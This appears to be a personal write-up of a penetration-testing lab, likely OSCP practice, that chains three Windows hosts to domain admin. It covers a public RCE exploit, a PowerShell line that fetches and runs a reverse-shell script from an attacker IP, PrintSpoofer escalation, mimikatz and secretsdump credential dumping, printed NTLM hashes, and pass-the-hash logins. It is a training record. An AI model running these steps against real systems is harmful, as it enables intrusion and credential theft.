# 141
## Take Away
- Remember to check for public exploit even if the website does not look like one with a legit vendor.
## Exploitation
- Directory Brute Forcing will identify a `.sql`file at URL `http://192.168.217.141:81/DB/apsystem.sql` which can locate a pair of credential `nurhodelta` with hash `$2y$10$fCOiMky4n5hCJx3cpsG20Od4wHtlkCLKmO6VLobJNRIg9ooHTkgjK` belongs to `Neovic Devierte`.![[Pasted image 20240215202842.png]]
- Using  `hashcat -m 3200 admin.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`, we can retrieve the plaintext password simply as `password`.![[Pasted image 20240215201755.png]]
- `searchsploit` will identify an `RCE` related to the web application running at port `81`. ![[Pasted image 20240216105732.png]]
	- However, we need to modify the path correspondingly.![[Pasted image 20240216110650.png]]
	- Run `python3 50801.py http://192.168.226.141:81/` to obtain a semi-interactive web shell.
		- Within the shell, run `powershell.exe -nop -w hidden -c iex(iwr http://192.168.45.229/nishang/Shells/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 192.168.45.229 443` to receive a fully-interactive reverse shell call back.
## PrivEsc
- Since we are logged in as user `ms01\mary.williams` with privilege `SeImpersonatePrivilege`, one can use `PrintSpoofer` to elevate privilege. ![[Pasted image 20240216134335.png]]
- Run `.\PrintSpoofer64.exe -i -c powershell` to elevate privilege. 
## Local Enumeration
- `mimikatz` with `sekurlsa::logonpasswords` can retrieve NTLM hash of the domain user `celia.almeda`. However, `hashcat` is not able to crack the hash.
- However, `proxychains netexec winrm 10.10.116.140 10.10.116.142 -u celia.almeda -H e728ecbadfb02f51ce8eed753f3ff3fd --continue-on-success` will identify the `celia` can access `xxx.xxx.xxx.142` through `winrm`. Hence, we can proceed our enumeration there.![[Pasted image 20240216142444.png]]
# 142
## Exploitation
Logging in as `celia.almeda` using `proxychains evil-winrm -i 10.10.116.142 -u celia.almeda -H e728ecbadfb02f51ce8eed753f3ff3fd`. ![[Pasted image 20240216171336.png]]
## Local Enumeration
- A little manual enumeration can find a window back file `windows.old` at the `C:\`. Retrieving `SAM` and `SYSTEM` file within using `winrm` download function. Finally, run `impacket-secretsdump -sam SAM -system SYSTEM LOCAL` to retrieve multiple pairs of credentials.![[Pasted image 20240216171631.png]]
```bash
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:acbb9b77c62fdd8fe5976148a933177a:::
tom_admin:1001:aad3b435b51404eeaad3b435b51404ee:4979d69d4ca66955c075c41cf45f24dc:::
Cheyanne.Adams:1002:aad3b435b51404eeaad3b435b51404ee:b3930e99899cb55b4aefef9a7021ffd0:::
David.Rhys:1003:aad3b435b51404eeaad3b435b51404ee:9ac088de348444c71dba2dca92127c11:::
Mark.Chetty:1004:aad3b435b51404eeaad3b435b51404ee:92903f280e5c5f3cab018bd91b94c771:::
```
# 140 DC
- Using `proxychains netexec smb 10.10.116.140 10.10.116.142 -u tom_admin -H 4979d69d4ca66955c075c41cf45f24dc --continue-on-success` to spray the newly found credential will discover `tom_admin` to be one of the `Domain Admins`.![[Pasted image 20240216172131.png]]
## Exploitation
- Obtain a shell using `proxychains impacket-psexec -hashes :4979d69d4ca66955c075c41cf45f24dc oscp/tom_admin@10.10.116.142 powershell.exe`